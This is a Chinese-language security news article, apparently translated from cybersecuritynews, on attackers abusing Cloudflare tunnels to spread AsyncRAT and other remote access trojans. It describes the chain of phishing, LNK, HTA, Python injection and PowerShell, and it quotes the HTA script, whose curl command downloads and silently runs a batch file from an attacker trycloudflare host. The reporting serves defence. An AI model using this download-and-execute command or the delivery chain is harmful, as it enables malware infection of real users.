---
title: Cloudflare 隧道遭滥用，恶意 RAT 传播威胁加剧
url: https://www.anquanke.com/post/id/306957
source: 安全客-有思想的安全新媒体
date: 2025-04-29
fetch_date: 2025-10-06T22:04:18.662169
---

# Cloudflare 隧道遭滥用，恶意 RAT 传播威胁加剧

首页

阅读

* [安全资讯](https://www.anquanke.com/news)
* [安全知识](https://www.anquanke.com/knowledge)
* [安全工具](https://www.anquanke.com/tool)

活动

社区

学院

安全导航

内容精选

* [专栏](/column/index.html)
* [精选专题](https://www.anquanke.com/subject-list)
* [安全KER季刊](https://www.anquanke.com/discovery)
* [360网络安全周报](https://www.anquanke.com/week-list)

# Cloudflare 隧道遭滥用，恶意 RAT 传播威胁加剧

阅读量**101559**

发布时间 : 2025-04-28 10:34:35

**x**

##### 译文声明

本文是翻译文章，文章原作者 Tushar Subhra Dutta，文章来源：cybersecuritynews

原文地址：<https://cybersecuritynews.com/hackers-abuse-cloudflare-tunnel-infrastructure/>

译文仅供参考，具体内容表达以及含义原文为准。

网络安全专家发现了一场复杂的攻击活动，攻击者利用 Cloudflare 的隧道基础设施来分发各种远程访问木马（RAT）。

自 2024 年 2 月以来，这一基础设施展现出了极强的韧性，它被用作恶意文件和木马的分发平台，使攻击者能够未经授权访问受害者的系统。

包括 Forcepoint、Fortinet、Orange 和 Proofpoint 在内的安全厂商已记录下这一持续存在的威胁，并强调了其不断演变的特性以及对全球各组织日益增长的影响。

主要的感染途径始于具有欺骗性的网络钓鱼电子邮件，其中包含伪装成发票或订单的恶意附件。

这些电子邮件通常制造虚假的紧迫感，可能还包含伪造的对话线程和回复，以使邮件看起来合法。

附件通常使用 “application/windows-library+xml” 文件格式，与二进制文件相比，这种文件格式看似无害，因此常常能够绕过电子邮件安全网关。

当打开该文件时，它会与托管在 Cloudflare 隧道基础设施上的远程 WebDav 资源建立连接。

Sekoia 威胁检测与研究（TDR）团队的分析师一直在监测这一攻击基础设施，其内部将其称为 “利用 Cloudflare 隧道基础设施分发多种远程访问木马”。

他们的分析揭示了一个复杂的多阶段感染链，该感染链采用了多种混淆技术来逃避检测系统。

即使在 2025 年，此次攻击的复杂性也表明了威胁行为者如何持续开发创新方法来绕过现代安全控制措施。

攻击者利用以 “trycloudflare.com” 为后缀的域名，包括 “malawi-light-pill-bolt.trycloudflare.com”、“players-time-corresponding-th.trycloudflare.com” 等，来托管他们的恶意内容。

这一基础设施传送有效载荷，最终在被攻陷的系统上建立持久的远程访问权限，这可能导致数据被盗取，以及网络遭到进一步破坏。

****感染链机制****

感染过程始于用户与伪装成 PDF 文档的 LNK 文件进行交互。

这个快捷方式并不会打开合法文档，而是从同一远程服务器执行一个 HTA 文件。HTA 文件的内容揭示了攻击的进展过程：

Set oShell = CreateObject(“WScript.Shell”)

oShell.Run “cmd.exe /c curl -o %temp%\ben.bat https://players-time-corresponding-th.trycloudflare.com/ben.bat && %temp%\ben.bat”, 0, false

self.Close

这段脚本会触发一个 BAT 文件，该文件会安装 Python 并执行经过混淆处理的 Python 代码，然后将下一阶段的有效载荷注入到 “notepad.exe” 进程中。

为了实现持久化，恶意软件会在 Windows 启动文件夹中放置两个 VBS 文件和另一个 BAT 文件来创建启动项。

最后一个阶段使用 PowerShell 反射性地加载从带有嵌入式 base64 编码有效载荷的 JPEG 图像中下载的有效载荷。

这就建立了远程访问木马（RAT）与它的命令控制服务器之间的连接，通常会使用像 “[duckdns.org](https://duckdns.org/)” 这样的动态 DNS 服务进行通信。

感染链通过涉及 Windows 库文件、LNK 文件、HTA 执行和 Python 注入的复杂多阶段过程来分发 AsyncRAT。

这场攻击活动的演变表明，威胁行为者在不断调整他们的技术以绕过安全控制，这凸显了采用多层检测方法以及持续监测类似攻击模式的重要性。

本文翻译自cybersecuritynews [原文链接](https://cybersecuritynews.com/hackers-abuse-cloudflare-tunnel-infrastructure/)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由**安全客**原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处： [https://www.anquanke.com/post/id/306957](/post/id/306957)

安全KER - 有思想的安全新媒体

本文转载自: [cybersecuritynews](https://cybersecuritynews.com/hackers-abuse-cloudflare-tunnel-infrastructure/)

如若转载,请注明出处： <https://cybersecuritynews.com/hackers-abuse-cloudflare-tunnel-infrastructure/>

安全KER - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

* [网络攻击](/tag/%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB)

**+1**8赞

收藏

![](https://p1.ssl.qhimg.com/t010857340ce46bb672.jpg)安全客

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

## 发表评论

您还未登录，请先登录。

[登录](/login/index.html)

![](https://p3.ssl.qhimg.com/t014757b72460d855bf.png)

[![](https://p1.ssl.qhimg.com/t010857340ce46bb672.jpg)](/member.html?memberId=175868)

[安全客](/member.html?memberId=175868)

这个人太懒了，签名都懒得写一个

* 文章
* **376**

* 粉丝
* **1**

### TA的文章

* ##### [mavinject.exe 遭利用，黑客绕过安全防线入侵系统](/post/id/306961)

  2025-04-28 10:48:18
* ##### [Docker 惊现新型加密挖矿攻击，借 Teneo 平台开辟恶意获利新路径](/post/id/306959)

  2025-04-28 10:39:59
* ##### [Cloudflare 隧道遭滥用，恶意 RAT 传播威胁加剧](/post/id/306957)

  2025-04-28 10:34:35
* ##### [xrpl.js 库遭供应链攻击，超 290 万次下载用户私钥成窃取目标](/post/id/306953)

  2025-04-28 10:29:02
* ##### [恶意后门借 ViPNet 更新渗透，俄罗斯多行业数据安全拉响警报](/post/id/306951)

  2025-04-28 10:22:13

### 相关文章

* ##### [Morte僵尸网络被披露：正利用路由器与企业应用漏洞，迅速扩张其“加载器即服务”活动](/post/id/312444)

  2025-09-29 18:04:01
* ##### [Akira勒索软件利用SonicWall VPN账户发起急速入侵](/post/id/312438)

  2025-09-29 18:03:28
* ##### [DarkCloud信息窃取器现新变种：采用VB6混淆技术并新增加密货币钱包窃取功能，威胁显著升级](/post/id/312435)

  2025-09-29 18:02:53
* ##### [TamperedChef恶意软件兴起：欺诈应用利用经过签名的二进制文件与搜索引擎投毒劫持浏览器](/post/id/312432)

  2025-09-29 18:02:25
* ##### [黑客将SVG文件武器化，用于隐秘投递恶意负载](/post/id/312351)

  2025-09-24 16:44:10
* ##### [ShadowV2僵尸网络利用配置错误的AWS Docker容器构建DDoS攻击租用服务](/post/id/312381)

  2025-09-24 16:40:43
* ##### [npm软件包“fezbox”中被发现新型恶意软件，可利用二维码窃取用户凭据](/post/id/312387)

  2025-09-24 16:40:06

### 热门推荐

文章目录

![](https://p0.qhimg.com/t11098f6bcd5614af4bf21ef9b5.png)

安全KER

* [关于我们](/about)
* [联系我们](/note/contact)
* [用户协议](/note/protocol)
* [隐私协议](/note/privacy)

商务合作

* [合作内容](/note/business)
* [联系方式](/note/contact)
* [友情链接](/link)

内容需知

* [投稿须知](https://www.anquanke.com/contribute/tips)
* [转载须知](/note/repost)
* 官网QQ群：568681302

合作单位

* [![安全KER](https://p0.ssl.qhimg.com/t01592a959354157bc0.png)](http://www.cert.org.cn/)
* [![安全KER](https://p0.ssl.qhimg.com/t014f76fcea94035e47.png)](http://www.cnnvd.org.cn/)

Copyright © 北京奇虎科技有限公司 三六零数字安全科技集团有限公司 安全KER All Rights Reserved [京ICP备08010314号-66](https://beian.miit.gov.cn/)[![](https://icon.cnzz.com/img/pic.gif)](https://www.cnzz.com/stat/website.php?web_id=1271278035 "站长统计")

微信二维码

**X**![安全KER](https://p0.ssl.qhimg.com/t0151209205b47f2270.jpg)